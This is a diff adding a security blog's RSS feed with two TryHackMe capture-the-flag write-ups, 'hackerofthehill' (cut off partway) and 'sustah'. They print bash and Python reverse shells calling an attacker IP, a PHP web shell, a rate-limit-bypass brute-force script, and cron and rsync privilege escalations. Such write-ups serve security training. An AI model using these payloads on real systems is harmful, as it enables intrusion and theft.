@@ -1,0 +1,2655 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Razor-Sec</title>
+    <description>Some writeup all about Tech, this website contains All about Cyber Security. Soon : DevOps and Cloud Computing</description>
+    <link>/</link>
+    <atom:link href="/feed.xml" rel="self" type="application/rss+xml"/>
+    <pubDate>Sat, 11 Jun 2022 10:06:25 -0500</pubDate>
+    <lastBuildDate>Sat, 11 Jun 2022 10:06:25 -0500</lastBuildDate>
+    <generator>Jekyll v4.2.0</generator>
+    
+      <item>
+        <title>Tryhackme hackerofthehill</title>
+        <description>&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
+&lt;p&gt;This is partical room from tryhackme entitled &lt;code&gt;hackerofthehill&lt;/code&gt; with 3 difficulty like easy, Medium ,Hard. For submitted any flag to the hackerone platform, we can get private bug bounty invitation. Link room in &lt;a href=&quot;https://tryhackme.com/room/hackerofthehill&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;easy&quot;&gt;Easy&lt;/h2&gt;
+
+&lt;h3 id=&quot;scanning&quot;&gt;Scanning&lt;/h3&gt;
+
+&lt;p&gt;Let’s just scanning full port of the box : &lt;code&gt;nmap 10.10.133.88 -sC -sV -p-&lt;/code&gt;. 
+Result :&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nmap 10.10.179.236 -p- --min-rate 10000                                                                 
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-11 19:59 WIB
+Warning: 10.10.179.236 giving up on port because retransmission cap hit (10).
+Nmap scan report for 10.10.179.236
+Host is up (0.34s latency).
+Not shown: 65511 closed ports
+PORT      STATE    SERVICE
+22/tcp    open     ssh
+80/tcp    open     http
+2120/tcp  filtered kauth
+5301/tcp  filtered hacl-gs
+8000/tcp  open     http-alt
+8001/tcp  open     vcom-tunnel
+8002/tcp  open     teradataordbms
+9999/tcp  open     abyss
+Nmap done: 1 IP address (1 host up) scanned in 29.46 seconds
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Full port Enumeration : &lt;code&gt;nmap 10.10.179.236 -p80,8000,8001,8002,9999 -sC -sV&lt;/code&gt;
+Result :&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nmap 10.10.179.236 -p80,8000,8001,8002,9999 -sC -sV
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-11 20:01 WIB
+Nmap scan report for 10.10.179.236
+Host is up (0.34s latency).
+
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry 
+|_/vbcms
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: VeryBasicCMS - Home
+8001/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+| http-title: My Website
+|_Requested resource was /?page=home.php
+8002/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Learn PHP
+9999/tcp open  abyss?
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 200 OK
+|     Date: Thu, 11 Mar 2021 13:01:56 GMT
+|     Content-Length: 0
+|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Date: Thu, 11 Mar 2021 13:01:54 GMT
+|     Content-Length: 0
+|   HTTPOptions: 
+|     HTTP/1.0 200 OK
+|     Date: Thu, 11 Mar 2021 13:01:55 GMT
+|_    Content-Length: 0
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port9999-TCP:V=7.91%I=7%D=3/11%Time=604A14C2%P=x86_64-pc-linux-gnu%r(Ge
+SF:tRequest,4B,&quot;HTTP/1\.0\x20200\x20OK\r\nDate:\x20Thu,\x2011\x20Mar\x2020
+SF:21\x2013:01:54\x20GMT\r\nContent-Length:\x200\r\n\r\n&quot;)%r(HTTPOptions,4
+SF:B,&quot;HTTP/1\.0\x20200\x20OK\r\nDate:\x20Thu,\x2011\x20Mar\x202021\x2013:0
+SF:1:55\x20GMT\r\nContent-Length:\x200\r\n\r\n&quot;)%r(FourOhFourRequest,4B,&quot;H
+SF:TTP/1\.0\x20200\x20OK\r\nDate:\x20Thu,\x2011\x20Mar\x202021\x2013:01:56
+SF:\x20GMT\r\nContent-Length:\x200\r\n\r\n&quot;)%r(GenericLines,67,&quot;HTTP/1\.1\
+SF:x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf
+SF:-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request&quot;)%r(RTSPRequest
+SF:,67,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;
+SF:\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request&quot;
+SF:)%r(Help,67,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
+SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
+SF:Request&quot;)%r(SSLSessionReq,67,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
+SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
+SF:r\n400\x20Bad\x20Request&quot;)%r(TerminalServerCookie,67,&quot;HTTP/1\.1\x20400\
+SF:x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nC
+SF:onnection:\x20close\r\n\r\n400\x20Bad\x20Request&quot;)%r(TLSSessionReq,67,&quot;
+SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20c
+SF:harset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request&quot;)%r(K
+SF:erberos,67,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
+SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
+SF:equest&quot;)%r(LPDString,67,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-
+SF:Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n40
+SF:0\x20Bad\x20Request&quot;)%r(LDAPSearchReq,67,&quot;HTTP/1\.1\x20400\x20Bad\x20Re
+SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
+SF:20close\r\n\r\n400\x20Bad\x20Request&quot;)%r(SIPOptions,67,&quot;HTTP/1\.1\x2040
+SF:0\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\
+SF:nConnection:\x20close\r\n\r\n400\x20Bad\x20Request&quot;);
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 112.57 seconds
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;port-8000&quot;&gt;Port 8000&lt;/h3&gt;
+
+&lt;p&gt;I have done checking a port 80 and its just default apache page and nothing there. So i move on to port 8000 and there is the page :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_hackerofthehill/bg_1_easy.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then i’m trying to using gobuster for brute the directory and file .&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;gobuster dir -u http://10.10.179.236:8000/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.166.45:8000
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     txt,html,php
+[+] Timeout:        10s
+===============================================================
+2021/03/11 20:10:18 Starting gobuster in directory enumeration mode
+===============================================================
+/about (Status: 200)
+/contact (Status: 200)
+/robots.txt (Status: 200)
+/server-status (Status: 403)
+===============================================================
+2021/03/11 20:25:47 Finished
+===============================================================
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;As you can see we found robots.txt, let’s take a look at that.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_hackerofthehill/bg_2_easy.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The file robots.txt tell us that there is some directory of cms, Now let’s see the page &lt;code&gt;/vbcms&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_hackerofthehill/bg_3_easy.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In this login form i’m trying to performs some default user credentials and i found user of admin &lt;code&gt;admin:admin&lt;/code&gt; .&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_hackerofthehill/bg_4_easy.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then there is some basic of cms we can edit to getting any shell, to simply we can use php command shell like this.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php  
+  exec(&quot;/bin/bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/10.2.47.251/9001 0&amp;gt;&amp;amp;1' &quot;);  
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/thm_hackerofthehill/bg_6_easy.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now we have the shell, After that we can get the flag.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;serv1@web-serv:/var/www/serv1/public$ cat /usr/games/fortune                                     
+cat /usr/games/fortune                                                               
+VEhNe05HSTROems0T0dJM01ERTRORFV6TldZd05qTXlaalkxfQo=                                 
+serv1@web-serv:/var/www/serv1/public$ cat /usr/games/fortune|base64 -d               
+cat /usr/games/fortune|base64 -d                                                     
+THM{NG----------------------------Y1}                                                
+serv1@web-serv:/var/www/serv1/public$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;port-8001&quot;&gt;Port 8001&lt;/h3&gt;
+
+&lt;p&gt;Let’s go to port 8001 :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_hackerofthehill/bg_7_easy.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then we go to tab Support :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_hackerofthehill/bg_8_easy.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;At this section i am using burpsuite to capture the response.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_hackerofthehill/bg_9_easy.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As you can see we can know where the location of the file upload and i’m tried to put the link upload to the parameter &lt;code&gt;?page=&lt;/code&gt; and there is the page.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_hackerofthehill/bg_10_easy.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The page shows us the text of the image we uploaded. So i tried to put basic command php and see what it works .&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_hackerofthehill/bg_11_easy.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then Let’s take a look at source code&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_hackerofthehill/bg_12_easy.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As you can see that its work. Now let’s put shell on php code like we doing before.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_hackerofthehill/bg_13_easy.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now we get the shell of serv2 :D, Let’s go to flag in &lt;code&gt;/var/lib/rary&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_hackerofthehill/bg_14_easy.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;port-8002&quot;&gt;Port 8002&lt;/h3&gt;
+
+&lt;p&gt;After port 8001 we gonna to take a look at port 8002 and here the page :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_hackerofthehill/bg_1_medium.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then we can create accound &lt;code&gt;Sign me Up&lt;/code&gt; and after sign up there can’t working, now just take a look at &lt;code&gt;try free lesson&lt;/code&gt; and check id &lt;code&gt;echo `id`;&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_hackerofthehill/bg_2_medium.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;then we can get any shell from this:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;exec(&quot;/bin/bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/10.2.47.251/9001 0&amp;gt;&amp;amp;1' &quot;);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/thm_hackerofthehill/bg_3_medium.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;then &lt;code&gt;nc -lvnp 9001&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_hackerofthehill/bg_4_medium.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So we can get flag in &lt;code&gt;/var/www/serv4/index.php&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;serv3@web-serv:/var/www/serv3/public$ cat /var/www/serv4/index.php
+                                                
+THM{Ym---------------------------zZh}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;privilage-escalation&quot;&gt;Privilage Escalation&lt;/h3&gt;
+
+&lt;p&gt;First i do checking crontab and there is have some process backup and its running on root. &lt;code&gt;/etc/crontab&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;
+serv3@web-serv:/var/www/serv3/public$ cat /etc/crontab 
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.monthly )
+#
+* * * * *  root /home/serv3/backups/backup.sh
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Since file permission is can be execute, then we can change backup.sh to all user &lt;code&gt;chmod 777 /home/serv3/backups/backup.sh&lt;/code&gt; and add code execution like this &lt;code&gt;echo 'bash -i &amp;gt;&amp;amp; /dev/tcp/10.2.47.251/9003 0&amp;gt;&amp;amp;1' &amp;gt;&amp;gt; /home/serv3/backups/backu.sh&lt;/code&gt;, the last of it is prepare the netcat &lt;code&gt;nc -lvnp 9003&lt;/code&gt;. Wait until we can hit in nc.
+&lt;img src=&quot;/assets/thm_hackerofthehill/bg_5_medium.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then wait it&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_hackerofthehill/bg_6_medium.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now we have the root user, so you can grab any flag or all flag if you want :D. the flag of root will be in &lt;code&gt;/root/root.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;medium&quot;&gt;Medium&lt;/h2&gt;
+
+&lt;h3 id=&quot;scanning-1&quot;&gt;Scanning&lt;/h3&gt;
+
+&lt;p&gt;Let’s just scanning full port of the box : ` nmap 10.10.59.182 -p- –min-rate 10000 `&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-18 17:22 WIB
+Nmap scan report for 10.10.59.182
+Host is up (0.39s latency).
+Not shown: 65529 filtered ports
+PORT     STATE SERVICE
+80/tcp   open  http
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3269/tcp open  globalcatLDAPssl
+3389/tcp open  ms-wbt-server
+
+Nmap done: 1 IP address (1 host up) scanned in 66.55 seconds
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now let’s enumeration all port : &lt;code&gt;nmap 10.10.59.182 -p80,135,139,445,3269 -sC -sV&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-18 17:25 WIB
+Nmap scan report for 10.10.59.182
+Host is up (0.37s latency).
+
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: PhotoStore - Home
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+3269/tcp open  tcpwrapped
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: -2s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2021-03-18T10:25:46
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 72.26 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Let’s take a look at port 80 :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_hackerofthehill/medium1.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now let’s signup and login this website then will be able go to dashboard.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_hackerofthehill/medium2.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;then i’m gonna to test upload file .jpg and this happens.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_hackerofthehill/medium3.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;if we clicked then web show us the image.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_hackerofthehill/medium4.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;and after looking around i found script.js which is we can disable it and try any command injection in username.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;$('input[name=&quot;username&quot;]').keyup(function(){
+    let username = $(this).val();
+    $(this).val( username.replace(/([^a-zA-Z0-9])/g,'') );
+});
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;i’m trying go to profile , then disable the script.js. I’m trying disable it in mozila firefox which just going to inspect then go to network and disable it.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_hackerofthehill/medium5.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now trying to get&lt;/p&gt;
+
+</description>
+        <pubDate>Thu, 11 Mar 2021 00:00:00 -0600</pubDate>
+        <link>/writeup-hackerofthehill/</link>
+        <guid isPermaLink="true">/writeup-hackerofthehill/</guid>
+        
+        <category>medium-box</category>
+        
+        <category>easy-box</category>
+        
+        <category>hard-box</category>
+        
+        <category>boot2root</category>
+        
+        <category>privilage escalation</category>
+        
+        <category>web exploitation</category>
+        
+        <category>windows</category>
+        
+        <category>Powershell</category>
+        
+        <category>sql injection</category>
+        
+        
+        <category>Tryhackme</category>
+        
+      </item>
+    
+      <item>
+        <title>Tryhackme sustah</title>
+        <description>&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
+
+&lt;p&gt;This is partical room from tryhackme entitled “sustah” from Tryhackme . Difficulty of This box is Medium and in this box you will learn all about exploiting CMS , Missconfiguration, Bruteforcing, Privilage escalation. Okay no let’s Pwn this box :p.&lt;/p&gt;
+
+&lt;p&gt;Room Link &lt;a href=&quot;https://tryhackme.com/room/sustah&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;scanning&quot;&gt;Scanning&lt;/h2&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
+
+&lt;p&gt;First we must scanning the ip using nmap : &lt;code&gt;nmap 10.10.195.141 -sC -sV&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Nmap scan report for 10.10.195.141
+Host is up (0.34s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 bd:a4:a3:ae:66:68:1d:74:e1:c0:6a:eb:2b:9b:f3:33 (RSA)
+|   256 9a:db:73:79:0c:72:be:05:1a:86:73:dc:ac:6d:7a:ef (ECDSA)
+|_  256 64:8d:5c:79:de:e1:f7:3f:08:7c:eb:b7:b3:24:64:1f (ED25519)
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Susta
+8085/tcp open  http    Gunicorn 20.0.4
+|_http-server-header: gunicorn/20.0.4
+|_http-title: Spinner
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Mar  4 17:20:51 2021 -- 1 IP address (1 host up) scanned in 24.76 seconds
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;As you can see the box have 3 port open like ssh, http and another cms. Now lets take a look at port 80: 
+&lt;img src=&quot;/assets/thm_sustah/bg_1.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nothing interesting here let’s jump to port 8085.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_sustah/bg_2.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;There is have some word &lt;code&gt;Feeling lucky? Guess the right number. You have a 0.004% chance of winning.&lt;/code&gt; which mean we can bruteforece number for the lucky.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_sustah/bg_3.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I have trying to bruteforce the number but there is have rate limits and i’m going to research then found &lt;a href=&quot;https://book.hacktricks.xyz/pentesting-web/rate-limit-bypass&quot;&gt;this&lt;/a&gt;. We can bypass it using header X-Remote-Addr: 127.0.0.1 and it worked.&lt;/p&gt;
+
+&lt;p&gt;My code :&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;#!/usr/bin/python3
+import requests
+import sys
+import re
+url = &quot;http://10.10.195.141:8085/&quot;
+
+reqse = requests.session()
+for number in range(10000,99999):
+        head = {&quot;X-Remote-Addr&quot; : &quot;127.0.0.1&quot;}
+        data = {&quot;number&quot; : number}
+        output = reqse.post(url, headers = head, data = data)
+        if &quot;rate limit exceeded&quot; in output.text:
+                print(&quot;Limit Exceeded :D&quot;)
+        elif &quot;Oh no! How unlucky. Spin the wheel and try again.&quot; in output.text:
+                print(&quot;try Number : &quot;,number)
+                pass
+        else:
+                print(f&quot;[+]The number is &quot;,number)
+                break
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;and here the result : 
+&lt;img src=&quot;/assets/thm_sustah/bg_4.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now we found the number, let’s put this.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_sustah/bg_5.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then we found path for getting cms site. now let’s go to &lt;code&gt;http://10.10.249.153/Yo---------th/&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_sustah/bg_6.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After looking around i’m found this which mean we can login as admin with default credentials.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_sustah/bg_7.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now lets going to file and create net file some revershell &lt;code&gt;&amp;lt;?php echo passthru($_GET['cmd']) ?&amp;gt; &lt;/code&gt; and upload it.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_sustah/bg_8.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The file will be saved in &lt;code&gt;/img/shellrazor.php&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_sustah/bg_10.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now lets check the command like this : &lt;code&gt;/shellrazor.php?cmd=id&lt;/code&gt;
+here the result&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_sustah/bg_12.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;getting-shell&quot;&gt;Getting shell&lt;/h2&gt;
+
+&lt;h3 id=&quot;web-shell&quot;&gt;Web shell&lt;/h3&gt;
+
+&lt;p&gt;Its works now let create some payload to getting revershell, here my payload to getting shell&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;export RHOST=&quot;10.2.47.251&quot;;export RPORT=4444;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/bash&quot;)'
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/thm_sustah/bg_13.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now we have shell. After looking some hint in thm there is have some backup file. After looking arround i found backup file in &lt;code&gt;/var/backups&lt;/code&gt; and contain password of user &lt;code&gt;.bak.passwd&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_sustah/bg_14.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;getting-user&quot;&gt;Getting user&lt;/h2&gt;
+
+&lt;p&gt;Now we just login with user kiran password :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_sustah/bg_16.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As you can see it’s work , Then we must getting root.&lt;/p&gt;
+
+&lt;h2 id=&quot;privilage-escalation&quot;&gt;Privilage Escalation&lt;/h2&gt;
+
+&lt;p&gt;In this case im using linpeas to get privilage escalation and i found this: 
+&lt;img src=&quot;/assets/thm_sustah/bg_17.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now let’s going to gtfobins &lt;a href=&quot;https://gtfobins.github.io/gtfobins/rsync/#sudo&quot;&gt;here&lt;/a&gt; about rsync and here my command : &lt;code&gt;doas rsync -e 'sh -c &quot;sh 0&amp;lt;&amp;amp;2 1&amp;gt;&amp;amp;2&quot;' 127.0.0.1:/dev/null&lt;/code&gt;
+&lt;img src=&quot;/assets/thm_sustah/bg_18.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And Boom!! we get the root XD&lt;/p&gt;
+
+&lt;p&gt;So thats it my writeup and there is so simple writeup you can follow if you want and see you next time :D&lt;/p&gt;
+
+&lt;p&gt;Happyhacking :D&lt;/p&gt;
+</description>
+        <pubDate>Fri, 05 Mar 2021 00:00:00 -0600</pubDate>
+        <link>/writeup-tryhackme-sustah/</link>
